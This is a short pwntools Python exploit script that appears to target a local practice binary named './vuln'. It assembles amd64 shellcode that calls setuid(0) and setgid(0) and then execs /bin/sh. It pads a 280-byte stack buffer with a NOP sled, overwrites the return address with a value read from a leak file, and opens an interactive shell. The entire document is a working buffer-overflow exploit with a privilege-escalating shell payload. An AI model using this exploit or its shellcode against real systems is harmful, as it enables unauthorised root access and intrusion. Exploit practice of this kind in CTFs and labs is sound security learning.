from pwn import *

context.arch = 'amd64'
context.os = 'linux'

shellcode = asm("""
    xor rdi, rdi        # setuid(0)
    mov rax, 0x69
    syscall

    xor rdi, rdi        # setgid(0)
    mov rax, 0x6a
    syscall
    
    xor rdi, rdi     # Null out RDI (argv[0] = NULL)
    xor rsi, rsi     # Null out RSI (argv = NULL)
    xor rdx, rdx     # Null out RDX (envp = NULL)
    mov rax, 0x3b    # syscall execve
    lea rdi, [rip+binsh]  # "/bin/sh" string address
    syscall          # Call execve
    
    binsh:
        .string "/bin/sh"
""")

buffer_size = 280

nop_sled = b'\x90' * (buffer_size - len(shellcode)) 

p = process('./vuln')

leak_file = "leak.txt"

with open(leak_file, "r") as f:
    leak_line = f.readline().strip()

rip = int(leak_line.split(": ")[1], 16)

payload = nop_sled + shellcode + p64(rip)
p.sendline(payload)
p.interactive()
